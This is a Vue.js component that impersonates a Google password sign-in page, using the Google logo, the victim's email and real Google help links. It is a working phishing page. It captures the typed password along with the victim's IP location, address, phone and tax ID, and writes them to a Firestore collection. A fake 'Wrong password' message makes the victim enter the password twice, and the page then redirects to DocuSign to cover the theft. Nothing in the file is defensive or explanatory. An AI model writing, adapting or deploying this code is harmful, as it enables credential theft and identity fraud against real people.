<template>
    <div>
     <div class="content">
        <v-card class="login-card" flat>
            <center>
                <img src="./google.svg" alt="" height='28px'>
            <br>
             <p style="font-size:25px;">Welcome</p>
 <v-chip
      class="ma-2"
      color="#1b1b1b"
      outlined
    >
      <v-icon left>mdi-account-circle</v-icon>
     <b>{{ getEmail }}</b> 
    </v-chip>
            <br><br>
             <v-text-field
             v-model="password"
            :append-icon="show1 ? 'mdi-eye' : 'mdi-eye-off'"
            :type="show1 ? 'text' : 'password'"
            label="Enter your Password"
            outlined
            @click:append="show1 = !show1"
          ></v-text-field>
            </center>
            <p style="color:red; font-size:14px" v-if="passLogic">Wrong password.Try again or click Forgot password to reset it.</p>
          <v-card-actions>
              <v-btn large color="blue" text small>Forgot Password</v-btn>
              <v-spacer></v-spacer>
              <v-btn v-if="btn" @click="Save" large depressed color="blue" dark>Next</v-btn>
               <v-btn v-else @click="Save2" large depressed color="blue" dark>Next</v-btn>
          </v-card-actions>
          
        </v-card> 
        <br>
        <div class="footer">
             <v-card-actions>
              <a style="color:#1b1b1b;font-size:13px;" href="https://policies.oath.com/us/en/oath/terms/otos/index.html">English</a>
      <v-spacer></v-spacer>
     <a style="color:#1b1b1b; font-size:13px;padding-right:15px;" href="https://support.google.com/accounts?hl=en#topic=3382296">Help</a>
     <a style="color:#1b1b1b;font-size:13px;padding-right:15px;" href="https://policies.google.com/privacy?gl=NG&hl=en">Privacy</a>
     <a style="color:#1b1b1b;font-size:13px;padding-right:15px;" href="https://policies.google.com/terms?gl=NG&hl=en">Terms</a>
        </v-card-actions>
    
        </div>
       
     </div>
     </div>
    
</template>

<script>
import db from '../../firebaseinit.js';
import firebase from 'firebase';
import { error } from 'util';
 import { mapGetters } from 'vuex'
  export default {
     data() {
    return {
       json:null,
         btn: true,
         passLogic: false,
           password: '',
           Cdate: new Date()
    }
  },
  computed:{
         ...mapGetters ([
             'getEmail',
            'getCompanyName',
            'getMailingAddressA1',
            'getMailingAddressA2',
            'getCity1',
            'getState1',
            'getZip1',
            'getContactName',
            'getPhoneNumber',
            'getFaxNumber',
            'getEmailAddress',
            'getMailingQuestion',
            'getMailingAddressB1',
            'getMailingAddressB2',
            'getCity2',
            'getState2',
            'getZip2',
            'getTaxDesignator',
            'getTaxId',
            'getType',
            'getStatus',
            'getEmployees'
         ]),
   },
   created(){
           var _this = this;
        $.getJSON('https://geoip-db.com/json/', function (json) {
            _this.json = json;
           });
     },

    methods:{
      Save(){
        db.collection('Details').add({
            Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Google',
        Email: this.getEmail,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity1,
         State2 :  this.getState1,
          Zip2 : this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
          TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
       .then(docRef =>  this.passLogic = true, this.password = "" , this.btn = false)
   
   .catch(error => console.log(err))
             },
             Save2(){
        db.collection('Details').add({
          Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Google',
        Email: this.getEmail,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity1,
         State2 :  this.getState1,
          Zip2 : this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
          TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
        window.location.assign("https://www.docusign.net/member/MemberLogin.aspx?mobile=true")
             }
    }
  }
</script>


<style scoped>
.footer {width:450px;margin:auto;}
a {
 text-decoration: none;
}
.login-footer {
    text-align: center;
    font-size: 12px;
    color: #26282a;
}
.login-card {border-radius:30px;padding:50px 30px 30px 30px; width: 450px;margin: auto;border: 1px solid rgb(197, 197, 197)}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 80px 180px; background: white;}

 @media (max-width: 991px) { 
    .footer {width:auto;margin:auto;}
a {
 text-decoration: none;
}
.login-footer {
    text-align: center;
    font-size: 12px;
    color: #26282a;
}
.login-card {border-radius:30px;padding:50px 30px 30px 30px; width: 450px;margin: auto;border: 1px solid rgb(197, 197, 197)}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 80px 180px; background: white;}
  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
      .footer {width:auto;margin:auto;}
a {
 text-decoration: none;
}
.login-footer {
    text-align: center;
    font-size: 12px;
    color: #26282a;
}
.login-card {border-radius:30px;padding:50px 30px 30px 30px; width: auto;margin: auto;border: 1px solid rgb(197, 197, 197)}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 80px 20px; background: white;}
}
</style>
